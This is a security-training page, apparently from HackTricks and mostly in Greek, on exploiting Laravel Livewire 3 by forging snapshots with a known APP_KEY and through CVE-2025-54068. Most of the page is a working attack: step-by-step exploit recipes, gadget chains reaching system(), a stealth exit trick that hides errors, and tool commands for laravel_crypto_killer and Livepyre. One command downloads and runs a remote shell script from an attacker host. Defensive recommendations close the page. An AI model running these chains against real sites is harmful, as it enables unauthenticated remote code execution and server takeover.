# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Ανακεφαλαίωση της μηχανής κατάστασης του Livewire

Τα components του Livewire 3 ανταλλάσσουν την κατάστασή τους μέσω **στιγμιότυπων** που περιέχουν `data`, `memo`, και έναν checksum. Κάθε POST στο `/livewire/update` επανυδατώνει το JSON snapshot στον server και εκτελεί τις σε ουρά `calls`/`updates`.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
Οποιοσδήποτε που διαθέτει το `APP_KEY` (το οποίο χρησιμοποιείται για την παραγωγή του `$hashKey`) μπορεί επομένως να πλαστογραφήσει αυθαίρετα snapshots επαναϋπολογίζοντας το HMAC.

Οι σύνθετες ιδιότητες κωδικοποιούνται ως **συνθετικές πλειάδες** που ανιχνεύονται από την `Livewire\Drawer\BaseUtils::isSyntheticTuple()`; κάθε πλειάδα είναι `[value, {"s":"<key>", ...meta}]`. Ο πυρήνας του hydration απλώς αναθέτει κάθε πλειάδα στον synth που επιλέγεται στο `HandleComponents::$propertySynthesizers` και επαναλαμβάνει την επεξεργασία στα παιδιά:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Αυτός ο αναδρομικός σχεδιασμός καθιστά το Livewire μια **γενική μηχανή δημιουργίας αντικειμένων** μόλις ένας επιτιθέμενος ελέγχει είτε τα μεταδεδομένα του tuple είτε οποιοδήποτε εμφωλευμένο tuple επεξεργάζεται κατά την αναδρομή.

## Συνθέτες που παρέχουν gadget primitives

| Synthesizer | Συμπεριφορά ελεγχόμενη από επιτιθέμενο |
|-------------|----------------------------------------|
| **CollectionSynth (`clctn`)** | Δημιουργεί instance με `new $meta['class']($value)` μετά την επανα-ενυδάτωση κάθε child. Οποιαδήποτε κλάση με array constructor μπορεί να δημιουργηθεί, και κάθε στοιχείο μπορεί με τη σειρά του να είναι ένα synthetic tuple. |
| **FormObjectSynth (`form`)** | Καλεί `new $meta['class']($component, $path)`, στη συνέχεια αναθέτει κάθε public property από τα children που ελέγχονται από επιτιθέμενο μέσω `$hydrateChild`. Constructors που δέχονται δύο χαλαρά τυποποιημένες παραμέτρους (ή προεπιλεγμένα args) αρκούν για να προσεγγιστούν οποιεσδήποτε public ιδιότητες. |
| **ModelSynth (`mdl`)** | Όταν το `key` απουσιάζει από το meta εκτελεί `return new $class;`, επιτρέποντας δημιουργία χωρίς ορίσματα οποιασδήποτε κλάσης υπό έλεγχο επιτιθέμενου. |

Επειδή οι synths καλούν `$hydrateChild` σε κάθε εμφωλευμένο στοιχείο, μπορούν να κατασκευαστούν αυθαίρετα gadget graphs στοίβαζοντας tuples αναδρομικά.

## Πλαστογράφηση snapshots όταν `APP_KEY` είναι γνωστό

1. Καταγράψτε ένα νόμιμο αίτημα `/livewire/update` και αποκωδικοποιήστε το `components[0].snapshot`.
2. Εισάγετε εμφωλευμένα tuples που δείχνουν σε gadget classes και επανυπολογίστε το `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`.
3. Επανακωδικοποιήστε το snapshot, κρατήστε `_token`/`memo` ανέπαφα και επαναπαίξτε το αίτημα.

Μια ελάχιστη απόδειξη εκτέλεσης χρησιμοποιεί **Guzzle's `FnStream`** και **Flysystem's `ShardedPrefixPublicUrlGenerator`**. Ένα tuple δημιουργεί instance του `FnStream` με δεδομένα constructor `{ "__toString": "phpinfo" }`, το επόμενο δημιουργεί `ShardedPrefixPublicUrlGenerator` με `[FnStreamInstance]` ως `$prefixes`. Όταν το Flysystem κάνει cast κάθε prefix σε `string`, η PHP καλεί την attacker-provided callable `__toString`, καλώντας οποιαδήποτε συνάρτηση χωρίς ορίσματα.

### Από κλήσεις συναρτήσεων σε πλήρες RCE

Εκμεταλλευόμενοι τα instantiation primitives του Livewire, οι Synacktiv προσαρμόσαν την αλυσίδα phpggc's `Laravel/RCE4` έτσι ώστε η ενυδάτωση να φορτώνει ένα αντικείμενο του οποίου η public Queueable κατάσταση ενεργοποιεί deserialization:

1. **Queueable trait** – οποιοδήποτε αντικείμενο που χρησιμοποιεί `Illuminate\Bus\Queueable` εκθέτει public `$chained` και εκτελεί `unserialize(array_shift($this->chained))` στο `dispatchNextJobInChain()`.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) δημιουργείται μέσω `CollectionSynth` / `FormObjectSynth` με την public `$chained` συμπληρωμένη.
3. **phpggc Laravel/RCE4Adapted** – το σειριοποιημένο blob που αποθηκεύεται σε `$chained[0]` κατασκευάζει `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` τελικά καλεί `call_user_func_array($closure, $args)` επιτρέποντας `system($cmd)`.
4. **Stealth termination** – παρέχοντας ένα δεύτερο callable `FnStream` όπως `[new Laravel\Prompts\Terminal(), 'exit']`, το αίτημα τελειώνει με `exit()` αντί για μια θορυβώδη εξαίρεση, διατηρώντας την HTTP απάντηση καθαρή.

### Αυτοματοποίηση πλαστογράφησης snapshot

`synacktiv/laravel-crypto-killer` τώρα περιλαμβάνει ένα `livewire` mode που συνθέτει όλα:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
Το εργαλείο αναλύει το captured snapshot, εισάγει τα gadget tuples, επαναϋπολογίζει το checksum και εκτυπώνει ένα payload έτοιμο προς αποστολή στο `/livewire/update`.

## CVE-2025-54068 – RCE χωρίς `APP_KEY`

Σύμφωνα με το vendor advisory, το ζήτημα επηρεάζει το Livewire v3 (>= 3.0.0-beta.1 and < 3.6.3) και είναι μοναδικό στο v3.

`updates` συγχωνεύονται στην κατάσταση του component **μετά** την επικύρωση του snapshot checksum. Εάν μια ιδιότητα μέσα στο snapshot είναι (ή γίνει) synthetic tuple, το Livewire επαναχρησιμοποιεί τα meta της ενώ πραγματοποιεί το hydrating στην attacker-controlled update value:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. Find a Livewire component with an untyped public property (e.g., `public $count;`).
2. Send an update that sets that property to `[]`. The next snapshot now stores it as `[[], {"s": "arr"}]`.

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. Craft another `updates` payload where that property contains a deeply nested array embedding tuples such as `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes are honoured even though the outer tuple and checksum never changed.
5. Reuse the same `CollectionSynth`/`FormObjectSynth` primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.

Key reasons this works:

- `updates` are not covered by the snapshot checksum.
- `getMetaForPath()` trusts whichever synth metadata already existed for that property even if the attacker previously forced it to become a tuple via weak typing.
- Recursion plus weak typing lets each nested array be interpreted as a brand new tuple, so arbitrary synth keys and arbitrary classes eventually reach hydration.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:

- Fingerprints the deployed Livewire version by parsing `<script src="/livewire/livewire.js?id=HASH">` and mapping the hash to vulnerable releases.
- Collects baseline snapshots by replaying benign actions and extracting `components[].snapshot`.
- Generates either an `updates`-only payload (CVE-2025-54068) or a forged snapshot (known APP_KEY) embedding the phpggc chain.
- If no object-typed parameter is found in a snapshot, Livepyre falls back to brute-forcing candidate params to reach a coercible property.

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` εκτελεί μη καταστροφική ανίχνευση, `-F` παρακάμπτει τον έλεγχο εκδόσεων, `-H` και `-P` προσθέτουν προσαρμοσμένα headers ή proxies, και `--function/--param` προσαρμόζουν τη συνάρτηση php που καλείται από το gadget chain.

## Αμυντικές συστάσεις

- Αναβαθμίστε σε διορθωμένες εκδόσεις του Livewire (>= 3.6.4 σύμφωνα με το δελτίο του προμηθευτή) και εφαρμόστε το patch του προμηθευτή για το CVE-2025-54068.
- Αποφύγετε weakly typed public properties σε Livewire components· ρητοί scalar τύποι εμποδίζουν τις τιμές των ιδιοτήτων να αναγκαστούν σε arrays/tuples.
- Καταχωρήστε μόνο τους synthesizers που πραγματικά χρειάζεστε και θεωρείστε τα user-controlled metadata (`$meta['class']`) ως μη αξιόπιστα.
- Απορρίψτε ενημερώσεις που αλλάζουν τον τύπο JSON μιας ιδιότητας (π.χ., scalar -> array) εκτός αν επιτρέπεται ρητά, και επαναϋπολογίστε τα synth metadata αντί να επαναχρησιμοποιείτε παλιές tuples.
- Ανανέώστε το `APP_KEY` άμεσα μετά από οποιαδήποτε αποκάλυψη, γιατί αυτό επιτρέπει offline snapshot forging ανεξάρτητα από το πόσο επιδιορθωμένη είναι η βάση κώδικα.

## Αναφορές

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
